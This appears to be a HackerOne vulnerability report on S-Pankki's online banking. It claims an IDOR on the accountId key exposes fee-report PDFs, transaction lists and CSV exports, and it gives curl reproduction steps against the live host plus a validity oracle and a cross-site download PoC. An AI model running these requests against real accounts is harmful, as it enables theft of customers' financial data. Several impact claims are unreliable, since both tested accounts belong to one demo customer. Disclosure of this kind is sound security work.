# HackerOne Report — S-Pankki e-banking

**Target:** `online.s-pankki.fi` (in scope — S-Pankki e-banking)
**Type:** Broken Access Control (BOLA/IDOR) + Information Disclosure + Cross-Site Request Forgery (SameSite=None tokenless GET)
**Auth:** Authenticated (any valid e-banking session)
**Severity:** Critical (CVSS 3.1: 8.2 High — justified as Critical by banking business impact)
**CVSS:3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`
**Tested:** 2026-10-14, program test account `12345678/123456`, UA `@wearehackerone`

---

## Summary:

**Broken Access Control (IDOR) — `accountId` leaks any customer's official PAD PDF report, full transaction data, and accountId-keyed CSV export via tokenless GET; the PDF vector works cross-site.**

`accountId` (opaque 64-hex) is the **sole global account key** of the S-Pankki e-banking app. It is exposed in plain URLs (account list page, report links, export links, per-transaction detail links), and multiple account-read endpoints trust the `accountId` supplied in the URL or session without verifying that the account belongs to the authenticated customer. No endpoint returns 403 for a foreign key — it simply generates/returns the data for it.

**Affected endpoints (all take/derive a 64-hex `accountId`):**

| # | Endpoint | Behavior |
|---|----------|----------|
| 1 | `GET /ebank/pad/fees/getReport.ds?accountId=<A>&year=<Y>` | **Server-generated official PDF fee report** for account A — `200 application/pdf`, ~116 KB, contains customer **full name, postal address, full IBAN**, statement period, complete fee + interest tables. **Purely URL-driven** (proven with fresh-login context×URL matrix) |
| 2 | `GET /ebank/accountview/showAccountDetails.do?accountId=<A>&back=mybank` → `GET /ebank/account/fetchTransactionList.do` | **Full transaction data page** for account A: current balance + complete transaction history with counterparty names. Context is set by a **plain GET, no CSRF token** |
| 3 | `GET /ebank/api/account/transactions/exportRangedTransactions.ds?accountId=<A>&fromDate=<DDMMYYYY>&toDate=<DDMMYYYY>&fileType=sba-CSV` | **CSV transaction export** keyed by accountId — columns: posting date, payment date, amount, type, payer, **recipient name, recipient IBAN, recipient BIC**, reference, message, archive code |
| 4 | `GET /ebank/account/initTransactionDetails.do?backLink=reset&accountId=<A>&rowNo=<N>&type=trans&archivecode=<c>` | **Per-transaction detail**, accountId + per-transaction archivecode in plain URL, no CSRF token (demo profile hides the table behind onboarding; production renders the full breakdown) |
| 5 | any of the above with an invalid `accountId` | `HTTP 200` + 509 B HTML error ("Tapahtui odottamaton virhe") — **validity oracle** (not 4xx/5xx, distinct from the PDF) |

**Root cause:** the back-end reads the opaque `accountId` from the request and never re-checks "does this account belong to the session's user?" (object-level authorization missing on the primary object key). Combined with (a) the key sitting in Referer-exposed URLs, and (b) a tokenless GET behind a `SameSite=None` session cookie, access control collapses to "whoever sees the accountId string gets that account's data and documents."

**Leak surface of the key:** `accountId` appears in plain URLs on the account list page (all accounts of the customer), on the tx page (every row links to `initTransactionDetails.do?accountId=…`), in report/export URLs, and in the app's own JS. It leaks via **Referer headers** (the app's JSESSIONID is `SameSite=None; Secure; HttpOnly; path=/ebank` — Referer is sent to other origins by default while the victim browses account pages), browser history/bookmarks, screenshots and support chats. The key is 64 hex chars (salted/derived — **not** an IBAN hash; all simple hash combos tested and rejected by the oracle), so it is not brute-forceable — but **once leaked it is sufficient and permanent** (never rotated).

**Cross-site vector (no second account needed):** `JSESSIONID` is `SameSite=None`, so the session cookie is sent on cross-site top-level GETs. `getReport.ds` is a tokenless plain GET returning a file — a top-level navigation from an attacker page executes it with the victim's session and auto-downloads the PDF for whatever `accountId` the attacker put in the URL (PoC: `poc/xsite_pdf_steal.html`).

**The data is real and non-zero** (all captured live 2026-10-14):
- Live front page (server-rendered): account FI96 3939 0001 0006 03 → **+5 500,00**, account FI74 3939 0001 0006 11 → **+5 500,00**, total **+11 000,00**, card 4318 12\*\* \*\*\*\* 9012 at **6 098,52** (attachment 16).
- Context-switched transaction pages, fresh, single session, different md5s and row sets per accountId (attachments 17/18):
  - **ACC1 page: 75,316 B, 9 non-zero transactions** (30.9.–9.10.2026): `−500,00 OMA TILISIIRTO MAIJA MEIKÄINEN`, `+50,00 TILISIIRTO MINNI MEIKÄINEN`, `−100,50 TILISIIRTO MATTI MEIKÄINEN`, `−21,00 KORTTIOSTO OSUUSKAUPPA SUOMI`, `−11,00 KORTTIOSTO MODERN LIVING`, `−50,00 TILISIIRTO MINNI MEIKÄINEN`, `−110,00 KORTTIOSTO ELÄINKAUPPA HOPE`, `+105,45 LAPSILISÄ KELA/LAPSILISÄT`, `−130,00 KORTTIOSTO HUONEKALULIIKE JAKKARA`.
  - **ACC2 page: 81,368 B, 15 different non-zero transactions** (all 9.10.2026): incl. `−250,00 TILISIIRTO`, `−18,65 PALKKA Sokos verkkokauppa`, `−100,00 VUOKRANMAKSU`.
- The official fees PDF shows `0,00` rows **by document type, not because the account is empty**: it is the PAD *fee statement* (bank's own Swedish header: "Redovisning av avgifter" = fee accounting); the demo customer has a basic account with **no paid fee package**, so every fee row is legitimately 0,00. Verified: `year=2024` → also an all-zero 116,299 B PDF (attachment 19, incl. a genuine backend row: period 01.01.2025–22.05.2017, 0,0100 %); `year=2026` (unfinished) → 56,644 B HTML page, not a PDF (attachment 20); the statement itself states that balance/transactions live in the separate account statement. All demo activity is in 2026 (CSV 2026 range → 302 data flow; 2025 range → header-only CSV) — exactly the year the fee statement does not cover. Full explanation: attachment 21.

**Impact:**
1. **Object-level authorization missing on the primary account key** — foreign accountIds are neither rejected (403) nor flagged; endpoints simply generate the data for them.
2. **Real, official, machine-generated artifacts are stolen** — not just a screenful of data: the bank's own PDF (identity, address, full IBAN, period, fees/interest) *and* the accountId-keyed CSV transaction export (recipient names, IBANs, BICs, amounts), both downloadable via tokenless GETs.
3. **Full financial profiling** — balance + complete transaction history with counterparty names (who pays whom how much) enables targeted phishing, social engineering, invoice fraud (name + address + IBAN) and account-takeover prep.
4. **Permanently leaky key** — 64-hex accountId in Referer-exposed URLs, never rotated; one leak is sufficient forever.
5. **Per-accountId validity oracles** — `getReport.ds` → 200 PDF vs 200 509 B error; `exportRangedTransactions.ds` → 302 vs 200 ~53 KB error — let an attacker confirm leaked id candidates without noise.
6. **Cross-site amplification** — `SameSite=None` session cookie + tokenless file GET ⇒ a single visit/click on an attacker page steals the victim's official PDF.
7. **Multiple accounts, one key** — every endpoint is keyed to the same unchecked `accountId`, so one leak exposes the whole account portfolio (demo: two distinct IBANs, distinct data per key).

## Steps To Reproduce:

Environment: `https://online.s-pankki.fi`, program test account, UA `@wearehackerone`. E-bank session idle timeout is **15 minutes** — keep one cookie jar per run.

1. **Log in**
   ```bash
   JAR=/tmp/spk.jar; rm -f $JAR; UA='@wearehackerone'
   curl -s -c $JAR -A "$UA" 'https://online.s-pankki.fi/ebank/' -o login.html
   CSRF=$(grep -oP 'name="CSRFToken" content="\K[^"]+' login.html)
   curl -s -b $JAR -c $JAR -A "$UA" 'https://online.s-pankki.fi/ebank/doLogin.do' \
     --data-urlencode "username=12345678" \
     --data-urlencode "password=123456" \
     --data-urlencode "csrfToken=$CSRF" -o login2.html
   ```
   (The one-script PoC `poc/pad_report_idor.sh` performs the exact working sequence end-to-end.)

2. **Harvest the victim accountIds — they are in plain URLs**
   ```bash
   curl -sL -b $JAR -A "$UA" 'https://online.s-pankki.fi/ebank/redirectByMenu.do?menuId=accounts_mnu_accounts' -o accts.html
   grep -oE 'accountId=[0-9a-f]{64}' accts.html | sort -u
   ```
   Demo user owns two accounts:
   - `ACC1 = 96c143b2048f99eff3e805fa9f836d0898868e5c2971aec58588b54cba57192f` → **FI96 3939 0001 0006 03**
   - `ACC2 = d62a61a6e0a6da88c31aa4ec87d6cd2a682084eac690e932a6a22e0abe947442` → **FI74 3939 0001 0006 11**

3. **Steal the victim's official PDF (URL-driven, no CSRF token)**
   ```bash
   curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/pad/fees/getReport.ds?accountId=${ACC2}&year=2025" -o rpt.pdf
   file rpt.pdf   # PDF, ~116 KB
   ```
   The PDF contains ACC2's full IBAN, customer name and postal address — generated for the accountId in the URL.

4. **Prove it is URL-driven, not context-driven (fresh-login matrix)**
   Set session context to ACC1 (`GET /ebank/accountview/showAccountDetails.do?accountId=${ACC1}&back=mybank`), then request `getReport.ds?accountId=${ACC2}` → **ACC2's** PDF comes back (attachment 03). Reverse the cells → ACC1's PDF (attachment 04). In all fresh-login cells the PDF **always** follows the URL parameter, never the session context.

5. **Prove the validity oracle**
   ```bash
   curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/pad/fees/getReport.ds?accountId=96c143b2048f99eff3e805fa9f836d0898868e5c2971aec58588b54cba57192e&year=2025" -o bad.html
   wc -c bad.html   # 200 + 509 B HTML error ("Tapahtui odottamaton virhe") — not a PDF, not 403/5xx
   ```
   Even a **1-character tamper** of a real accountId flips the result (attachments 05/06).

6. **Steal the victim's full transaction data (context-driven, plain GET, no CSRF token)**
   ```bash
   # reliable context setter — the link the front page itself uses (no side effects):
   curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/accountview/showAccountDetails.do?accountId=${ACC2}&back=mybank" -o ctx.html
   # parameterless fetch returns THE CONTEXT ACCOUNT'S data page:
   curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/account/fetchTransactionList.do" -o tx_acc2.html
   wc -c tx_acc2.html   # 81,368 B — 15 non-zero transactions, counterparty names
   ```
   Repeat with ACC1 → 75,316 B page with a **different set of 9 transactions** (attachments 17/18: different sizes, different md5s, different rows — the page is keyed to the accountId). Note: the direct `fetchTransactionList.do?accountId=X` param is ignored (byte-identical, same md5, to the last context account's page; no context → 56 KB empty shell) — the session context drives this endpoint, same missing-ownership-check root cause.

7. **Steal the accountId-keyed CSV export (tokenless GET)**
   ```bash
   # empty range -> real CSV document keyed by accountId (recipient name/IBAN/BIC columns):
   curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/api/account/transactions/exportRangedTransactions.ds?accountId=${ACC2}&fromDate=01012025&toDate=31122025&fileType=sba-CSV" -o exp.csv
   head exp.csv
   # Kirjauspäivä;Maksupäivä;Summa;Tapahtumalaji;Maksaja;Saajan nimi;Saajan tilinumero;Saajan BIC-tunnus;Viitenumero;Viesti;Arkistointitunnus
   # invalid id -> 200 + ~53-56 KB HTML error page (second oracle)
   # 2026 range (rows exist) -> 302 Location: /ebank/account/processTransactionList.do (one-shot file processor; demo serves the 1,367 B session-closed page — demo one-shot restriction, production streams the full rows)
   ```
   The app's own CSV button fires exactly this tokenless GET (attachment 15).

8. **Cross-site steal (no second account needed)**
   While logged in with the victim's browser (JSESSIONID `SameSite=None; Secure; HttpOnly`), open `poc/xsite_pdf_steal.html` from an attacker origin — the top-level navigation to `getReport.ds?accountId=<victim>` executes with the victim's session and auto-downloads the victim's official PDF cross-origin.

## Supporting Material/References:

All 21 artifacts + full test log are in `evidence/` (self-contained copies; index with per-file descriptions in `EVIDENCE_INDEX.md`); runnable PoCs in `poc/`; curl-level walk-through in `REPRODUCE.md`.

**PDF report IDOR (headline):**
* `evidence/01_pad_fees_report_urlACC1_FI96.pdf` (116,300 B) — official PAD fee report generated for ACC1 via URL; full IBAN FI96 3939 0001 0006 03 inside
* `evidence/02_pad_fees_report_urlACC2_FI74.pdf` (116,300 B) — same endpoint, URL accountId=ACC2; IBAN FI74 3939 0001 0006 11 inside
* `evidence/03_matrix_ctxACC1_urlACC2_returns_FI74.pdf` (116,300 B) — **definitive IDOR cell**: session context = ACC1, URL = ACC2 → PDF contains ACC2's IBAN (URL wins)
* `evidence/04_matrix_ctxACC2_urlACC1_returns_FI96.pdf` (116,300 B) — reverse matrix cell
* `evidence/05_oracle_invalid_accountId_509b_error.html` (509 B) — invalid accountId → 200 + 509 B HTML error (validity oracle)
* `evidence/06_oracle_tampered_accountId_509b_error.html` (509 B) — 1-char-tampered real id → same 509 B error
* `evidence/07_txlist_full_data_ACC1_FI96_balance_history.html` — full data page: FI96, balance, history with counterparty names
* `evidence/08_getReportScript_plainGET_newwindow.js` — app's own report opener: plain GET, new window, no token
* `evidence/09_txlist_context_switched_to_ACC2_FI74.html` — same endpoint, different accountId context → FI74 page
* `evidence/10_pdf_text_report_ACC1.txt` / `evidence/11_pdf_text_report_ACC2.txt` — extracted text of the two PDFs

**CSV export IDOR (second downloadable artifact):**
* `evidence/12_csv_export_valid_accountId_csv_header.csv` — live CSV returned for a valid accountId (recipient name/IBAN/BIC columns)
* `evidence/13_csv_export_invalid_accountId_56kb_error.html` — invalid accountId → error page (oracle)
* `evidence/14_csv_export_302_flow.txt` — full CSV-export flow analysis (incl. 302 → one-shot processor)
* `evidence/15_app_csv_export_link_js.js` — app JS showing the exact tokenless GET the CSV button fires

**Non-zero proof & "why the PDF shows zeros" (added 2026-10-14):**
* `evidence/16_frontpage_live_nonzero_balances.html` (68,139 B) — server-rendered front page: ACC1 +5 500,00; ACC2 +5 500,00; total +11 000,00; card 4318 12\*\* \*\*\*\* 9012 at 6 098,52
* `evidence/17_txlist_FRESH_ACC1_FI96_nine_nonzero_transactions.html` (75,316 B, md5 2e474f31…) — fresh ACC1 tx page: 9 non-zero transactions with counterparty names (KELA, Osuuskauppa Suomi, Modern Living, Eläinkauppa Hope, Huonekaluliike Jakkara)
* `evidence/18_txlist_FRESH_ACC2_FI74_fifteen_nonzero_transactions.html` (81,368 B, md5 a1a33b7f…) — fresh ACC2 tx page: 15 different non-zero transactions (−250,00 TILISIIRTO, −18,65 PALKKA Sokos, −100,00 VUOKRANMAKSU)
* `evidence/19_pad_fees_report_year2024_ACC1_zero_fees.pdf` (116,299 B) — `year=2024` → also all-zero fees (fee statement, no fee package); genuine backend row 01.01.2025–22.05.2017, 0,0100 %
* `evidence/20_pad_fees_report_year2026_returns_HTML_demo_page.html` (56,644 B) — `year=2026` (unfinished) → HTML, not PDF
* `evidence/21_nontzero_proof_summary.md` — full explanation: why the PDF shows 0,00 (fee statement "Redovisning av avgifter", no fee package, 2024/2025/2026 probes) + all non-zero captures tabulated + third URL-driven endpoint `initTransactionDetails.do?accountId&rowNo&archivecode` + context-setter behavior notes

**PoCs & logs:**
* `poc/pad_report_idor.sh` — end-to-end PoC (login → harvest ids → both PDFs → matrix cells → oracle → txlist context switch → CSV export); verified 2026-10-14
* `poc/xsite_pdf_steal.html` — cross-site PDF steal (SameSite=None top-level navigation)
* `evidence/test_log.txt` — complete test matrix, all md5s, endpoint semantics, year/oracle probes, 2026-10-14 late-session verification

**Notes for triage:**
* Demo limitation: both accounts belong to the same demo customer (TESTI MAIJA) — cross-account proof within one user; the endpoints show no ownership check at all (any valid id is honored, invalid ids hit the oracle path).
* `account/showAccountDetails.do` intermittently kills the session (1,361 B "yhteys on suljettu" + `JSESSIONID Max-Age=0`) — reported as a separate companion Medium; use the `accountview/` variant (reliable, used by the front page itself) for reproduction.
* Numbers in the HTML use U+00A0 no-break spaces in digit groups (`+5 500,00`) — grep with `FI[0-9]{2}` / `\xa0` if verifying.
